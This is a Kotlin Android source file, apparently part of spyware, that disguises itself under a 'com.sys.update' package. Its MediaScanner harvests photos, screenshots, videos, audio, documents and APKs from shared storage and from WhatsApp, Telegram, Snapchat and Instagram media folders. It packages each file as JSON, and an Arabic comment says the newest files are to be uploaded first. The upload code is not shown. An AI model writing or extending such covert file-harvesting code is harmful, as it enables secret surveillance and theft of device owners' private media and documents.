package com.sys.update

import android.content.Context
import android.os.Environment
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MediaScanner {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private const val MAX_FILE_MB = 15L

    data class MediaFile(
        val path: String,
        val name: String,
        val size: Long,
        val lastModified: Long,
        val mime: String
    )

    fun scanImages(context: Context): List<MediaFile> {
        val list = scanByExtension(
            listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff", "raw")
        )
        // 🔥 رتّب حسب الأحدث أولًا — الأحدث ينرفع أول
        return list.sortedByDescending { it.lastModified }
    }

    fun scanVideos(context: Context): List<MediaFile> = scanByExtension(
        listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
    )

    fun scanAudio(context: Context): List<MediaFile> = scanByExtension(
        listOf("mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr")
    )

    fun scanDocuments(context: Context): List<MediaFile> = scanByExtension(
        listOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "zip", "rar", "7z", "apk")
    )

    private fun scanByExtension(extensions: List<String>): List<MediaFile> {
        val result = mutableListOf<MediaFile>()

        val roots = listOf(
            File("/storage/emulated/0/DCIM/Camera"),
            File("/storage/emulated/0/DCIM/Screenshots"),
            File("/storage/emulated/0/Pictures/Screenshots"),
            File("/storage/emulated/0/Pictures/Camera"),
            File("/storage/emulated/0/DCIM"),
            File("/storage/emulated/0/Pictures"),
            File("/storage/emulated/0/Download"),
            File("/storage/emulated/0/Documents"),
            File("/storage/emulated/0/Movies"),
            File("/storage/emulated/0/Music"),
            File("/storage/emulated/0/WhatsApp/Media"),
            File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
            File("/storage/emulated/0/Telegram"),
            File("/storage/emulated/0/Android/media/org.telegram.messenger"),
            File("/storage/emulated/0/Snapchat"),
            File("/storage/emulated/0/Instagram"),
            Environment.getExternalStorageDirectory()
        )

        for (root in roots) {
            walk(root, extensions, result, depth = 0, maxDepth = 10, limit = 8000)
        }
        return result.distinctBy { it.path }
    }

    private fun walk(
        dir: File?,
        extensions: List<String>,
        out: MutableList<MediaFile>,
        depth: Int,
        maxDepth: Int,
        limit: Int
    ) {
        if (dir == null || !dir.exists() || !dir.isDirectory || depth > maxDepth || out.size >= limit) return
        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return
        for (f in children) {
            if (out.size >= limit) return
            try {
                if (f.isDirectory) {
                    if (f.name.startsWith(".")) continue
                    walk(f, extensions, out, depth + 1, maxDepth, limit)
                } else {
                    val ext = f.extension.lowercase(Locale.US)
                    if (extensions.contains(ext)) {
                        val sizeMb = f.length() / (1024 * 1024)
                        if (sizeMb <= MAX_FILE_MB) {
                            out.add(
                                MediaFile(
                                    path = f.absolutePath,
                                    name = f.name,
                                    size = f.length(),
                                    lastModified = f.lastModified(),
                                    mime = guessMime(ext)
                                )
                            )
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun guessMime(ext: String): String = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "gif" -> "image/gif"
        "webp" -> "image/webp"
        "heic", "heif" -> "image/heic"
        "bmp" -> "image/bmp"
        "mp4", "m4v" -> "video/mp4"
        "mkv" -> "video/x-matroska"
        "mov" -> "video/quicktime"
        "avi" -> "video/x-msvideo"
        "webm" -> "video/webm"
        "mp3" -> "audio/mpeg"
        "wav" -> "audio/wav"
        "ogg", "opus" -> "audio/ogg"
        "m4a" -> "audio/mp4"
        "aac" -> "audio/aac"
        "flac" -> "audio/flac"
        "pdf" -> "application/pdf"
        "zip" -> "application/zip"
        "apk" -> "application/vnd.android.package-archive"
        else -> "application/octet-stream"
    }

    fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
        put("type", "media")
        put("path", mf.path)
        put("name", mf.name)
        put("size", mf.size)
        put("modified", timeFmt.format(Date(mf.lastModified)))
        put("mime", mf.mime)
    }
}
